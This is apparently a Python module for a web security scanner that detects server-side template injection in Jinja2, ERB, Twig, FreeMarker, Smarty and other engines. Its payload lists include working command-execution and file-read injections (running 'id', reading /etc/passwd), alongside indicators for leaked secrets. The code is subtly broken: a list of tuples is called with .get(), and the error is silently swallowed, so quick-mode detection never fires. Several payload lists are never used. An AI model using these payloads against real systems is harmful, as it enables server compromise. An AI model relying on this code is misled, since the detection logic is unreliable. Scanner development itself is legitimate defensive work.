"""
Server-Side Template Injection (SSTI) Detector
Detects template injection vulnerabilities in various template engines
Supports: Jinja2, Tornado, ERB, Smarty, Twig, FreeMarker, Velocity, Thymeleaf, Pug
"""

import re
import logging

logger = logging.getLogger(__name__)


class SSTIDetector:
    """Detect Server-Side Template Injection vulnerabilities
    
    Tests for SSTI across multiple template engines using:
    1. Math expression evaluation (7*7 = 49)
    2. Configuration object access
    3. Command execution patterns
    4. Template-specific syntax testing
    """
    
    # Jinja2 / Flask (Python)
    JINJA2_PAYLOADS = [
        "{{7*7}}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.join(request.application.__globals__.__builtins__.__import__('os').popen('id').readlines())}}",
        "{{7*'7'}}",  # Should return 7777777
    ]
    
    # Tornado (Python)
    TORNADO_PAYLOADS = [
        "{{1+1}}",
        "{{7*7}}",
        "{% import os %}{{os.system('id')}}",
    ]
    
    # ERB (Ruby)
    ERB_PAYLOADS = [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= File.open('/etc/passwd').read %>",
    ]
    
    # Smarty (PHP)
    SMARTY_PAYLOADS = [
        "{7*7}",
        "{php}echo 7*7;{/php}",
        "{system('id')}",
    ]
    
    # Twig (PHP)
    TWIG_PAYLOADS = [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ]
    
    # FreeMarker (Java)
    FREEMARKER_PAYLOADS = [
        "${7*7}",
        "#{7*7}",
        "${7*'7'}",
        "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
    ]
    
    # Velocity (Java)
    VELOCITY_PAYLOADS = [
        "#set($x=7*7)$x",
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()",
    ]
    
    # Thymeleaf (Java)
    THYMELEAF_PAYLOADS = [
        "[[${7*7}]]",
        "[(${7*7})]",
    ]
    
    # Pug/Jade (Node.js)
    PUG_PAYLOADS = [
        "#{7*7}",
        "#{function(){localLoad=require;sh=localLoad('child_process').exec('id')}()}",
    ]
    
    # Handlebars (JavaScript)
    HANDLEBARS_PAYLOADS = [
        "{{#with 'constructor'}}{{#with split}}{{pop (push 'alert(1)')}}{{/with}}{{/with}}",
    ]
    
    # Quick mode payloads (mathematic expressions that are template-engine agnostic)
    QUICK_PAYLOADS = [
        "{{7*7}}",   # Jinja2, Twig, Tornado
        "${7*7}",    # FreeMarker
        "<%= 7*7 %>", # ERB
        "{7*7}",     # Smarty
        "#{7*7}",    # Velocity, FreeMarker, Pug
    ]
    
    # Expected results for math operations
    MATH_RESULTS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{7*7}", "49"),
        ("#{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("${7*'7'}", "7777777"),
    ]
    
    # Command execution indicators
    COMMAND_INDICATORS = [
        r'uid=\d+',
        r'gid=\d+',
        r'root:x:0:0:',
        r'www-data',
        r'apache',
        r'nginx',
    ]
    
    # Config/internal object disclosure indicators
    CONFIG_INDICATORS = [
        r'SECRET_KEY',
        r'DATABASE',
        r'PASSWORD',
        r'API_KEY',
        r'<class',
        r'__main__',
        r'wsgi.application',
    ]
    
    # Common parameter names
    COMMON_PARAMS = [
        'name', 'template', 'message', 'content', 'body', 'text',
        'comment', 'description', 'title', 'subject', 'email',
        'search', 'query', 'input', 'data'
    ]
    
    def __init__(self, client, quick_mode=False):
        """Initialize SSTI detector
        
        Args:
            client: HTTP client for making requests
            quick_mode: If True, test only most common template engines
        """
        self.client = client
        self.quick_mode = quick_mode
        logger.info(f"SSTI Detector initialized (quick_mode={quick_mode})")
    
    def test(self, path, param=None):
        """Test endpoint for SSTI"""
        params_to_test = [param] if param else self.COMMON_PARAMS
        
        # Reduce params in quick mode
        if self.quick_mode and not param:
            params_to_test = self.COMMON_PARAMS[:5]
        
        for test_param in params_to_test:
            # Test with quick payloads in quick mode
            if self.quick_mode:
                result = self._test_math_expression(path, test_param, self.QUICK_PAYLOADS)
                if result:
                    return result
            else:
                # Test all template engines
                result = self._test_jinja2(path, test_param)
                if result:
                    return result
                
                result = self._test_erb(path, test_param)
                if result:
                    return result
                
                result = self._test_freemarker(path, test_param)
                if result:
                    return result
                
                result = self._test_twig(path, test_param)
                if result:
                    return result
                
                result = self._test_smarty(path, test_param)
                if result:
                    return result
        
        return None
    
    def _test_math_expression(self, path, param, payloads):
        """Test mathematical expression evaluation"""
        for payload in payloads:
            try:
                # Baseline without SSTI payload
                baseline = self.client.get(path, params={param: "test123"})
                baseline_text = baseline.text if baseline and baseline.text else ""
                
                # Test with SSTI payload
                res = self.client.get(path, params={param: payload})
                if not res or not res.text:
                    continue
                
                response_text = res.text
                
                # Check if expected result appears
                expected = self.MATH_RESULTS.get(payload, "49")
                
                # Payload should NOT appear literally, but result should
                if expected in response_text and payload not in response_text:
                    # Make sure it's not in baseline
                    if expected not in baseline_text:
                        return {
                            "type": "ssti",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Template evaluated: {payload} -> {expected}",
                            "confidence": 0.95,
                            "severity": "critical",
                            "description": "Server-Side Template Injection allows code execution"
                        }
                
                # Try POST as well
                res_post = self.client.post(path, data={param: payload})
                if res_post and res_post.text:
                    if expected in res_post.text and payload not in res_post.text:
                        if expected not in baseline_text:
                            return {
                                "type": "ssti",
                                "endpoint": path,
                                "param": param,
                                "payload": payload,
                                "method": "POST",
                                "evidence": f"Template evaluated via POST: {payload} -> {expected}",
                                "confidence": 0.95,
                                "severity": "critical"
                            }
            
            except Exception as e:
                logger.debug(f"SSTI test error: {e}")
                continue
        
        return None
    
    def _test_jinja2(self, path, param):
        """Test Jinja2/Flask SSTI"""
        for payload in self.JINJA2_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text if res.text else ""
                
                # Check for math result
                if "{{7*7}}" in payload and "49" in response_text and "{{7*7}}" not in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "Jinja2/Flask",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "Jinja2 template evaluated",
                        "confidence": 0.95,
                        "severity": "critical"
                    }
                
                # Check for string multiplication
                if "{{7*'7'}}" in payload and "7777777" in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "Jinja2/Flask", 
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "Jinja2 string multiplication evaluated",
                        "confidence": 0.98,
                        "severity": "critical"
                    }
                
                # Check for config disclosure
                if "config" in payload.lower():
                    for indicator in self.CONFIG_INDICATORS:
                        if re.search(indicator, response_text, re.IGNORECASE):
                            return {
                                "type": "ssti",
                                "template_engine": "Jinja2/Flask",
                                "endpoint": path,
                                "param": param,
                                "payload": payload,
                                "evidence": f"Config object disclosed: {indicator}",
                                "confidence": 0.9,
                                "severity": "critical"
                            }
                
                # Check for command execution
                for indicator in self.COMMAND_INDICATORS:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        return {
                            "type": "ssti",
                            "template_engine": "Jinja2/Flask",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Command executed: {indicator}",
                            "confidence": 0.98,
                            "severity": "critical"
                        }
            
            except Exception:
                continue
        
        return None
    
    def _test_erb(self, path, param):
        """Test ERB (Ruby) SSTI"""
        for payload in self.ERB_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text if res.text else ""
                
                if "<%= 7*7 %>" in payload and "49" in response_text and payload not in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "ERB/Ruby",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "ERB template evaluated",
                        "confidence": 0.95,
                        "severity": "critical"
                    }
                
                # Check for command execution
                for indicator in self.COMMAND_INDICATORS:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        return {
                            "type": "ssti",
                            "template_engine": "ERB/Ruby",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Command executed: {indicator}",
                            "confidence": 0.98,
                            "severity": "critical"
                        }
            
            except Exception:
                continue
        
        return None
    
    def _test_freemarker(self, path, param):
        """Test FreeMarker (Java) SSTI"""
        for payload in self.FREEMARKER_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text if res.text else ""
                
                if ("${7*7}" in payload or "#{7*7}" in payload) and "49" in response_text and payload not in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "FreeMarker/Java",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "FreeMarker template evaluated",
                        "confidence": 0.95,
                        "severity": "critical"
                    }
            
            except Exception:
                continue
        
        return None
    
    def _test_twig(self, path, param):
        """Test Twig (PHP) SSTI"""
        for payload in self.TWIG_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text if res.text else ""
                
                if "{{7*7}}" in payload and "49" in response_text and payload not in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "Twig/PHP",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "Twig template evaluated",
                        "confidence": 0.95,
                        "severity": "critical"
                    }
                
                if "{{7*'7'}}" in payload and "7777777" in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "Twig/PHP",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "Twig string multiplication evaluated",
                        "confidence": 0.98,
                        "severity": "critical"
                    }
            
            except Exception:
                continue
        
        return None
    
    def _test_smarty(self, path, param):
        """Test Smarty (PHP) SSTI"""
        for payload in self.SMARTY_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text if res.text else ""
                
                if "{7*7}" in payload and "49" in response_text and payload not in response_text:
                    return {
                        "type": "ssti",
                        "template_engine": "Smarty/PHP",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": "Smarty template evaluated",
                        "confidence": 0.95,
                        "severity": "critical"
                    }
            
            except Exception:
                continue
        
        return None
